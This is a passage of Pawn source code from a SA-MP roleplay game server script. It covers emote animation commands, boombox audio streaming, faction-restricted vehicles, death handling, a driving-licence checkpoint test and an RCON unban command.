	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	ApplyAnimation(playerid,"WUZI","Wuzi_follow",4.0,0,0,0,0,0);
	return 1;
}

IRP:greet(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	ApplyAnimation(playerid,"WUZI","Wuzi_Greet_Wuzi",4.0,0,0,0,0,0);
	return 1;
}

IRP:stand(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	LoopingAnim(playerid,"WUZI","Wuzi_stand_loop", 4.0, 1, 0, 0, 0, 0);
	return 1;
}

IRP:hitch(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	LoopingAnim(playerid,"MISC","Hiker_Pose", 4.0, 1, 0, 0, 0, 0);
	return 1;
}

IRP:bitchslap(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	ApplyAnimation(playerid,"MISC","bitchslap",4.0,0,0,0,0,0);
	return 1;
}

IRP:cpr(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	OnePlayAnim(playerid,"MEDIC","CPR",4.0,0,0,0,0,0);
	ApplyAnimation(playerid,"KISSING","gift_give",4.0,0,0,0,0,0);
	return 1;
}

IRP:gift(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	ApplyAnimation(playerid,"KISSING","gift_give",4.0,0,0,0,0,0);
	return 1;
}

IRP:slapass(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	ApplyAnimation(playerid,"SWEET","sweet_ass_slap",4.0,0,0,0,0,0);
	return 1;
}

IRP:drunk(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	LoopingAnim(playerid,"PED","WALK_DRUNK",4.1,1,1,1,1,1);
	return 1;
}

IRP:bomb(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	ApplyAnimation(playerid, "BOMBER", "BOM_Plant", 4.0, 0, 0, 0, 0, 0);
	return 1;
}

IRP:rob(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	LoopingAnim(playerid,"ped", "ARRESTgun", 4.0, 0, 1, 1, 1, 0);
	return 1;
}

IRP:laugh(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	ApplyAnimation(playerid, "RAPPING", "Laugh_01", 4.0, 0, 0, 0, 0, 0);
	return 1;
}

IRP:lookout(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	ApplyAnimation(playerid, "SHOP", "ROB_Shifty", 4.0, 0, 0, 0, 0, 0);
	return 1;
}

IRP:robman(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	LoopingAnim(playerid, "SHOP", "ROB_Loop_Threat", 4.0, 1, 0, 0, 0, 0);
	return 1;
}

IRP:hide(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	LoopingAnim(playerid, "ped", "cower", 3.0, 1, 0, 0, 0, 0);
	return 1;
}

IRP:vomit(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	ApplyAnimation(playerid, "FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0);
	return 1;
}

IRP:eat(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	ApplyAnimation(playerid, "FOOD", "EAT_Burger", 3.0, 0, 0, 0, 0, 0);
	return 1;
}

IRP:crack(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
    LoopingAnim(playerid, "crack", "crckdeth2", 4.0, 1, 0, 0, 0, 0);
	return 1;
}

IRP:fucku(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	ApplyAnimation(playerid,"PED","fucku",4.0,0,0,0,0,0);
	return 1;
}

IRP:taichi(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	LoopingAnim(playerid,"PARK","Tai_Chi_Loop", 4.0, 1, 0, 0, 0, 0);
	return 1;
}

IRP:kiss(playerid, var[])
{
	if(IsPlayerCuffed(playerid) ||  IsPlayerInAnyVehicle(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
	    return 1;
	}
	ApplyAnimation(playerid,"KISSING","Playa_Kiss_01",4.0,0,0,0,0,0);
	return 1;
}

//========================================[ End of OnPlayerCommandText]==============================================
forward DownloadTimer(playerid, songid);
public DownloadTimer(playerid, songid)
{
	if(Logged(playerid))
	{
	    if(GetProgressBarValue(Download[playerid]) >= 100)
	    {
	    	HideProgressBarForPlayer(playerid, Download[playerid]);
	    	if(songid == 1) SendClientMessage(playerid, COLOR_ORANGE, "[Smartphone]: You have successfully downloaded 'Champaigne Showers - LMFAO'.");
			else if(songid == 2) SendClientMessage(playerid, COLOR_ORANGE, "[Smartphone]: You have successfully downloaded 'Club can't Handle Me - David Guetta'.");
			TaxMoney += 50;
			GiveZamoraMoney(playerid, -50);
			Player[playerid][pSong][songid] = 1;
	    }
	    else
	    {
	    	SetProgressBarValue(Download[playerid], GetProgressBarValue(Download[playerid])+1);
	    	UpdateProgressBar(Download[playerid], playerid);
	    	SetTimerEx("DownloadTimer", 300, false, "ii", playerid, songid);
	    }
	}
	return 1;
}




forward gmxtimer();
public gmxtimer()
{
    foreach(Player, i)
    {
       	SaveChar(i);
       	ClearCar(i);
       	ClearChar(i);
       	GMX[i] = 1;
    }
	SendRconCommand("gmx");
}

public OnPlayerEnterDynamicArea(playerid, areaid)
{
        foreach(Player, i)
        {
            if(GetPVarType(i, "BBArea"))
            {
                if(areaid == GetPVarInt(i, "BBArea"))
                {
                    new station[256];
                    GetPVarString(i, "BBStation", station, sizeof(station));
                    if(!isnull(station))
                                {
                                        PlayStream(playerid, station, GetPVarFloat(i, "BBX"), GetPVarFloat(i, "BBY"), GetPVarFloat(i, "BBZ"), 30.0, 1);
                                        SendClientMessage(playerid, -1, "You have entered an boombox area");
                    }
                                return 1;
                }
            }
        }
        return 1;
}
public OnPlayerLeaveDynamicArea(playerid, areaid)
{
    foreach(Player, i)
        {
            if(GetPVarType(i, "BBArea"))
            {
                if(areaid == GetPVarInt(i, "BBArea"))
                {
                    StopStream(playerid);
                    SendClientMessage(playerid, -1, "You have left the boombox area");
                                return 1;
                }
            }
        }
        return 1;
}
stock StopStream(playerid)
{
        DeletePVar(playerid, "pAudioStream");
    StopAudioStreamForPlayer(playerid);
}

stock PlayStream(playerid, url[], Float:posX = 0.0, Float:posY = 0.0, Float:posZ = 0.0, Float:distance = 50.0, usepos = 0)
{
        if(GetPVarType(playerid, "pAudioStream")) StopAudioStreamForPlayer(playerid);
        else SetPVarInt(playerid, "pAudioStream", 1);
    PlayAudioStreamForPlayer(playerid, url, posX, posY, posZ, distance, usepos);
}

stock PickUpBoombox(playerid)
{
    foreach(Player, i)
        {
                if(IsPlayerInDynamicArea(i, GetPVarInt(playerid, "BBArea")))
                {
                StopStream(i);
                }
        }
        DeletePVar(playerid, "BBArea");
        DestroyDynamicObject(GetPVarInt(playerid, "PlacedBB"));
        DestroyDynamic3DTextLabel(Text3D:GetPVarInt(playerid, "BBLabel"));
        DeletePVar(playerid, "PlacedBB"); DeletePVar(playerid, "BBLabel");
        DeletePVar(playerid, "BBX"); DeletePVar(playerid, "BBY"); DeletePVar(playerid, "BBZ");
        DeletePVar(playerid, "BBInt");
        DeletePVar(playerid, "BBVW");
        DeletePVar(playerid, "BBStation");
        return 1;
}

stock SendNearbyMessage(playerid, Float:radius, string[], col1, col2, col3, col4, col5)
{
        new Float:x, Float:y, Float:z;
        GetPlayerPos(playerid, x, y, z);
        new Float:ix, Float:iy, Float:iz;
        new Float:cx, Float:cy, Float:cz;
        foreach(Player, i)
        {
                if(gPlayerLoggin{i})
            {
                if(GetPlayerInterior(playerid) == GetPlayerInterior(i) && GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(i))
                {
                                GetPlayerPos(i, ix, iy, iz);
                                cx = (x - ix);
                                cy = (y - iy);
                                cz = (z - iz);
                                if(((cx < radius/16) && (cx > -radius/16)) && ((cy < radius/16) && (cy > -radius/16)) && ((cz < radius/16) && (cz > -radius/16)))
                                {
                                    SendClientMessage(i, col1, string);
                                }
                                else if(((cx < radius/8) && (cx > -radius/8)) && ((cy < radius/8) && (cy > -radius/8)) && ((cz < radius/8) && (cz > -radius/8)))
                                {
                                    SendClientMessage(i, col2, string);
                                }
                                else if(((cx < radius/4) && (cx > -radius/4)) && ((cy < radius/4) && (cy > -radius/4)) && ((cz < radius/4) && (cz > -radius/4)))
                                {
                                    SendClientMessage(i, col3, string);
                                }
                                else if(((cx < radius/2) && (cx > -radius/2)) && ((cy < radius/2) && (cy > -radius/2)) && ((cz < radius/2) && (cz > -radius/2)))
                                {
                                    SendClientMessage(i, col4, string);
                                }
                                else if(((cx < radius) && (cx > -radius)) && ((cy < radius) && (cy > -radius)) && ((cz < radius) && (cz > -radius)))
                                {
                                    SendClientMessage(i, col5, string);
                                }
                        }
            }
        }
        return 1;
}
public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	if(!ispassenger)
	{
		if(IsDMVCar(vehicleid))
		{
		    if(!LicenseTest[playerid])
		    {
			    new Float:pos[3];
			    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
			    SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		        SendClientMessage(playerid, COLOR_ORANGE, "You are not taking a drivers license test.");
		    }
		    else
		    {
		        SendClientMessage(playerid, COLOR_LIGHTBLUE, "* GPS: Finish the test by driving through all of the checkpoints on your GPS.");
		        SetPlayerCheckpoint(playerid,2040.7101,-1930.1340,13.4667,5);
		        CP[playerid] = 1;
		        SendClientMessage(playerid, COLOR_RED, "If you exit the car your test will be failed and it will have to be re-done.");
		    }
		}
		if(IsVIPCar(vehicleid) && Player[playerid][pVIP] < 1)
	    {
		    new Float:pos[3];
		    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SendClientMessage(playerid, COLOR_VIP, " You can't start the engine as it belongs to the VIP.");
	    }
        if(!Player[playerid][pCarLic])
        {
		    SendClientMessage(playerid, COLOR_ORANGE, "You dont have a car license to drive a car.");
	    }
	    if(IsAPlane(vehicleid) && Player[playerid][pFlyLic] == 0)
        {
            new Float:pos[3];
		    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SendClientMessage(playerid, COLOR_ORANGE, "You dont have a flying license to fly a plane.");
	    }
	    if(IsAPlane(vehicleid) && DayZeroGravity == 1)
	    {
            new Float:pos[3];
		    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SendClientMessage(playerid, COLOR_ORANGE, "Today all travelling agency are closed. ((/day))");
	    }
	    if(IsLeoVehicle(vehicleid) && Player[playerid][pFac] != 1)
	    {
		    new Float:pos[3];
		    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SendClientMessage(playerid, COLOR_ORANGE, " You can't start the engine as it belongs to the LSPD.");
	    }
	    if(IsLSFMDVehicle(vehicleid) && Player[playerid][pFac] != 5)
	    {
		    new Float:pos[3];
		    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SendClientMessage(playerid, COLOR_ORANGE, " You can't start the engine as it belongs to the LSFMD.");
	    }
	    if(IsNewsVehicle(vehicleid) && Player[playerid][pFac] != 4)
	    {
		    new Float:pos[3];
		    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SendClientMessage(playerid, COLOR_ORANGE, " You can't start the engine as it belongs to the News Agency.");
	    }
	    if(IsFBIVehicle(vehicleid) && Player[playerid][pFac] != 6)
	    {
		    new Float:pos[3];
		    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SendClientMessage(playerid, COLOR_ORANGE, " You can't start the engine as it belongs to the FBI.");
	    }
	    if(IsDOCVehicle(vehicleid) && Player[playerid][pFac] != 7)
	    {
		    new Float:pos[3];
		    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SendClientMessage(playerid, COLOR_ORANGE, " You can't start the engine as it belongs to the NG.");
	    }
	    if(IsTruckerVehicle(vehicleid) && Player[playerid][pJob] != JOB_TRUCKER)
	    {
	    	new Float:pos[3];
		    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SendClientMessage(playerid, COLOR_ORANGE, " You can't start the engine as it belongs to the Truckers.");
	    }
	    if(IsGovVehicle(vehicleid) && Player[playerid][pFac] != 2)
	    {
		    new Float:pos[3];
		    GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SetPlayerPos(playerid, pos[0], pos[1], pos[2]);
		    SendClientMessage(playerid, COLOR_ORANGE, " You can't start the engine as it belongs to the GOV.");
	    }
	}
	return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{
	if(LicenseTest[playerid])
	{
		DisablePlayerCheckpoint(playerid);
		LicenseTest[playerid] = 0;
		CP[playerid] = 0;
		SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Driving Center: You have left your car, therefore your test has been failed.");
	}
	if(Player[playerid][pFac] == 1)
	{
	    LastCar[playerid] = vehicleid;
	}
	if(Player[playerid][pFac] == 6)
	{
	    LastCar[playerid] = vehicleid;
	}
	if(Player[playerid][pFac] == 7)
	{
	    LastCar[playerid] = vehicleid;
	}
	if(Player[playerid][pFac] == 5)
	{
	    LastCar[playerid] = vehicleid;
	}
	LastCar[playerid] = vehicleid;
	TextDrawHideForPlayer(playerid, FuelText[playerid]);
    TextDrawHideForPlayer(playerid, SpeedText[playerid]);
	return 1;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
	if(newstate == PLAYER_STATE_PASSENGER)
	{
	    SetPlayerArmedWeapon(playerid,0);
	}
	if(newstate == PLAYER_STATE_PASSENGER)
	{
	    if(newstate == PLAYER_STATE_PASSENGER)
	    {
	        new gun,tmp;
	        GetPlayerWeaponData(playerid,4,gun,tmp);
	        #pragma unused tmp
	        if(gun)SetPlayerArmedWeapon(playerid,gun);
	        else SetPlayerArmedWeapon(playerid,0);
	    }
	}
	if ((oldstate == PLAYER_STATE_ONFOOT) && (newstate == PLAYER_STATE_PASSENGER || newstate == PLAYER_STATE_DRIVER))
    {
        OldVehID [playerid] = GetPlayerVehicleID (playerid);
    }
    if(newstate == PLAYER_STATE_WASTED && !Paintball[playerid] && !Event[playerid])
    {
        if(Player[playerid][pDead])
        {
            Player[playerid][pDead] = 0;
            SendClientMessage(playerid,COLOR_MEDIC,"------------------ Health Advise -----------------");
            SendClientMessage(playerid,COLOR_WHITE,"You are now in the afterlife. You may rest in peace.");
            SendClientMessage(playerid,COLOR_WHITE,"When you revive, you will lost memory of last 30 minutes.");
            SendClientMessage(playerid,COLOR_WHITE,"If you were non-RPly killed, report the player at the forums.");
            SendClientMessage(playerid,COLOR_MEDIC,"--------------------------------------------------------");
            Player[playerid][pHospital] = 1;
            SpawnChar(playerid);
        }
		else
		{
            Player[playerid][pDead] = 1;
            SetPlayerHealth(playerid, 100);
            Player[playerid][pArmor] = 0;
            //ApplyAnimation(playerid,"KNIFE","KILL_Knife_Ped_Die", 4.0, 0, 1, 1, 1, 0);
            SetPlayerSkin(playerid, Player[playerid][pModel]);
     		for(new i = 0; i < 13; i++)
     		{
               if(Player[playerid][pWeapon][i]) GiveZamoraWeapon(playerid, Player[playerid][pWeapon][i], Player[playerid][pWeaponAmmo][i]);
         	}
            GetPlayerPos(playerid, Player[playerid][pX], Player[playerid][pY], Player[playerid][pZ]);
            DeathPosX[playerid] = Player[playerid][pX];
            DeathPosY[playerid] = Player[playerid][pY];
            DeathPosZ[playerid] = Player[playerid][pZ];
            SetPlayerPos(playerid,DeathPosX[playerid],DeathPosY[playerid],DeathPosZ[playerid]);
      	    SetPlayerCameraPos(playerid,DeathPosX[playerid],DeathPosY[playerid],DeathPosZ[playerid]+5);
            SetPlayerCameraLookAt(playerid,DeathPosX[playerid],DeathPosY[playerid],DeathPosZ[playerid]);
            SetPlayerVirtualWorld(playerid, Player[playerid][pVW]);
      	    SetPlayerInterior(playerid, Player[playerid][pInt]);
     	    SetPlayerPos(playerid,DeathPosX[playerid],DeathPosY[playerid],DeathPosZ[playerid]);
     	    SetTimerEx("AutoDeath",AUTODEATH_SECONDS * 1000,false,"i",playerid);
            SendClientMessage(playerid,COLOR_MEDIC,"------------------ Health Advise -----------------");
            SendClientMessage(playerid,COLOR_WHITE,"You are now laying death. You are bleeding to death.");
         	SendClientMessage(playerid,COLOR_WHITE,"Remember that the medics can revive you.");
            SendClientMessage(playerid,COLOR_WHITE,"You can type /acceptdeath, if no medics are available.");
            SendClientMessage(playerid,COLOR_MEDIC,"--------------------------------------------------------");
            DeletePVar(playerid, "SpeedRadar");
            Mobile[playerid] = INVALID_PLAYER_ID;
            ApplyAnimation(playerid,"KNIFE","KILL_Knife_Ped_Die",4.1,0,0,0,1,0,0);
            TogglePlayerControllable(playerid, 0);
            if(DeliverMoney[playerid] == 1)
        	{
	            new Rob = BankRobber[playerid]-1;
        	    DisablePlayerCheckpoint(playerid);
         		BankRobbersCount --;
          		format(BankRobbers[Rob], MAX_PLAYER_NAME, "");
        		DeliverMoney[playerid] = 0;
         		BankRobber[playerid] = 0;
        		if(BankRobbersCount == 0)
				{
       	    		BankRobbery = 0;
        			RobberyStarted = 0;
        		}
        	}
       }
    }
	//WEAPON HOLSTER
	if(oldstate==PLAYER_STATE_ONFOOT)
	{
		RemovePlayerAttachedObject(playerid, 0);
		OldWeapon[playerid]=0;
		HoldingWeapon[playerid]=0;
	}
	if(newstate == PLAYER_STATE_DRIVER && oldstate != PLAYER_STATE_DRIVER)
	{
	    new vehicleid = GetPlayerVehicleID(playerid);
	    new engine, lights, alarm, doors, bonnet, boot, objective;
		GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
		if(!engine && !IsABike(vehicleid))
		{
            GameTextForPlayer(playerid, "~w~Turn on your engine ~n~~b~/engine", 4000, 5);
        }
        if(fMeter[playerid])
		{
		   TextDrawShowForPlayer(playerid, FuelText[playerid]);
		}
		if(Speedo[playerid])
		{
           TextDrawShowForPlayer(playerid, SpeedText[playerid]);
        }
    }
    if(oldstate == PLAYER_STATE_DRIVER && newstate == PLAYER_STATE_ONFOOT)
	{
	    TextDrawHideForPlayer(playerid, FuelText[playerid]);
        TextDrawHideForPlayer(playerid, SpeedText[playerid]);
	}
    if(oldstate == PLAYER_STATE_PASSENGER && newstate == PLAYER_STATE_ONFOOT) // checking if player was in a vehicle
    {
        if(GetPVarInt( playerid, "ThermalActive" ) == 1) // Checking if player have thermal active
        {
            THERMALOFF( playerid ); // If Player exits vehicle we set his thermal mode off
        }
    }
	return 1;
}

public OnPlayerEnterCheckpoint(playerid)
{
    if(DeliverMoney[playerid] == 1 && IsPlayerInRangeOfPoint(playerid, 10, -1478.9646,2631.4436,58.7813))
	{
	    new Rob = BankRobber[playerid]-1, string[128];
	    DisablePlayerCheckpoint(playerid);
		BankRobbersCount --;
		format(BankRobbers[Rob], MAX_PLAYER_NAME, "");
		DeliverMoney[playerid] = 0;
		GiveZamoraMoney(playerid, 100000);
		format(string, sizeof(string), "** %s has delivered their stolen money and claimed $100,000. **", GetName(playerid));
		SendRobberyMessage(COLOR_YELLOW, string);
		BankRobber[playerid] = 0;
		//
		if(BankRobbersCount == 0)
		{
			BankRobbery = 0;
			RobberyStarted = 0;
		}
	}
    if(CP[playerid] == 1) // Drivers License Test
	{
		if(IsPlayerInRangeOfPoint(playerid,5,2040.7101,-1930.1340,13.4667)) // Checkpoint 1
		{
		    SetPlayerCheckpoint(playerid,1948.1033,-1930.6860,13.4751,5);
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,1948.1033,-1930.6860,13.4751)) // Checkpoint 2
		{
		    SetPlayerCheckpoint(playerid,1830.9167,-1930.0353,13.4754,5);
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,1830.9167,-1930.0353,13.4754)) // Checkpoint 3
		{
			SetPlayerCheckpoint(playerid,1823.9110,-1791.2739,13.4752,5);
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,1823.9110,-1791.2739,13.4752)) // Checkpoint 4
		{
			SetPlayerCheckpoint(playerid,1824.1433,-1629.3223,13.4751,5);
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,1824.1433,-1629.3223,13.4751)) // Checkpoint 5
		{
			SetPlayerCheckpoint(playerid,1929.6962,-1614.7090,13.4751,5);
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,1929.6962,-1614.7090,13.4751)) // Checkpoint 6
		{
			SetPlayerCheckpoint(playerid,1938.9127,-1738.9067,13.4751,5);
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,1938.9127,-1738.9067,13.4751)) // Checkpoint 7
		{
			SetPlayerCheckpoint(playerid,1959.0842,-1765.3502,13.4750,5);
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,1959.0842,-1765.3502,13.4750)) // Checkpoint 8
		{
			SetPlayerCheckpoint(playerid,1975.3130,-1814.8724,13.4751,5);
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,1975.3130,-1814.8724,13.4751)) // Checkpoint 9
		{
			SetPlayerCheckpoint(playerid,2066.9341,-1814.9067,13.4751,5);
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,2066.9341,-1814.9067,13.4751 )) // Checkpoint 10
		{
			SetPlayerCheckpoint(playerid,2078.9148,-1897.3009,13.4473,5);
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,2078.9148,-1897.3009,13.4473)) // Checkpoint 11
		{
			SetPlayerCheckpoint(playerid,2074.2095,-1907.4380,13.6393,5);
		}
		else if(IsPlayerInRangeOfPoint(playerid,5,2074.2095,-1907.4380,13.6393)) // Checkpoint 12
		{
		    new Float:Health;
		    GetVehicleHealth(GetPlayerVehicleID(playerid), Health);
		    if(Health > 900)
			{
				DisablePlayerCheckpoint(playerid);
				Player[playerid][pCarLic] = 1;
				LicenseTest[playerid] = 0;
				CP[playerid] = 0;
				GiveZamoraMoney(playerid, -800);
				SetVehicleToRespawn(GetPlayerVehicleID(playerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Driving Center: You have successfully passed the test and received your license.");
			}
			else
			{
				DisablePlayerCheckpoint(playerid);
				LicenseTest[playerid] = 0;
				CP[playerid] = 0;
				SetVehicleToRespawn(GetPlayerVehicleID(playerid));
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "* Driving Center: You have damaged your vehicle hardly, therefore you failed the test.");
			}
		}
	}
	else DisablePlayerCheckpoint(playerid);
	return 1;
}

public OnPlayerLeaveCheckpoint(playerid)
{
	return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
	return 1;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
	return 1;
}

public OnRconCommand(cmd[])
{
    if(!strcmp(cmd, "unbanplayer", true, 128))
    {
       	new string[128], var[64], user[32];
       	if(sscanf(cmd[128], "s[32]s[32]", user, var))
		{
            print("** [Usage]: unbanplayer [yourname] [playername]");
		}
       	new file[64], IP[16], file2[64], IP2[16];
       	format(file, sizeof(file), "Accounts/%s.ini", var);
       	if(dini_Exists(file))
       	{
            format(IP, sizeof(IP), "%s", dini_Get(file, "IP"));
       	    format(file2, sizeof(file2), "Bans/%s.ini", var);
 	        format(IP2, sizeof(IP2), "Bans/%s.ini", IP);
            if(!dini_Exists(file2)) return print("AdminWarning: Make sure that the name you've entered is banned.");
       	    // Removing from ban file
       	    if(dini_Exists(file2)) return dini_Remove(file2);
    	    if(dini_Exists(IP2)) return dini_Remove(IP2);
   	        // Removing from accounts file
       	    dini_IntSet(file, "pBanned", 0);
       	    dini_IntSet(file, "Warns", 0);
       	    dini_Set(file, "Warn1", "");
       	    dini_Set(file, "Warn2", "");
       	    dini_Set(file, "Warn3", "");
       	    dini_Set(file, "BanReason", "");
            dini_Set(file, "BannedBy", "");
            print("AdminWarning: You've successfully unbanned the player.");
            format(string, sizeof(string), "AdminWarning: %s has unbanned %s from the developement page.", user, var);
    		SendAdminMessage(COLOR_ADMWARN,  string);
       	}
       	else
       	{
   	        print("AdminWarning: You've entered an inavlid player name.");
       	}
    }
    if(!strcmp(cmd, "sms", true))
    {
		print("MOTDs loaded successfully.");
	}
	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
	return 1;
}

public OnObjectMoved(objectid)
{
    new Float:x, Float:y, Float:z;
	for(new i; i < sizeof(Obj_FloorDoors); i ++)
	{
		if(objectid == Obj_FloorDoors[i][0])
		{
		    GetObjectPos(Obj_FloorDoors[i][0], x, y, z);

		    if(x < X_DOOR_L_OPENED - 0.5)   // Some floor doors have shut, move the elevator to next floor in queue:
		    {
				Elevator_MoveToFloor(ElevatorQueue[0]);
				RemoveFirstQueueFloor();
			}
		}
	}

	if(objectid == Obj_Elevator)   // The elevator reached the specified floor.
	{
	    KillTimer(ElevatorBoostTimer);  // Kills the timer, in case the elevator reached the floor before boost.

	    FloorRequestedBy[ElevatorFloor] = INVALID_PLAYER_ID;

	    Elevator_OpenDoors();
	    Floor_OpenDoors(ElevatorFloor);

	    GetObjectPos(Obj_Elevator, x, y, z);

	    ElevatorState 	= ELEVATOR_STATE_WAITING;
	    SetTimer("Elevator_TurnToIdle", ELEVATOR_WAIT_TIME, 0);
	}

	return 1;
}
public OnPlayerObjectMoved(playerid, objectid)
{
	return 1;
}

public OnPlayerPickUpPickup(playerid, pickupid)
{
	if(pickupid == DOCPickup)
    {
        GameTextForPlayer(playerid, "~w~You can enter this building by ~n~typing ~b~/enter", 2000, 5);
	}
	if(pickupid == BUYPickup)
    {
        GameTextForPlayer(playerid, "~w~You can  fill your business by ~n~typing ~b~/buyproducts", 2000, 5);
	}
	if(pickupid == WithdrawPickup)
    {
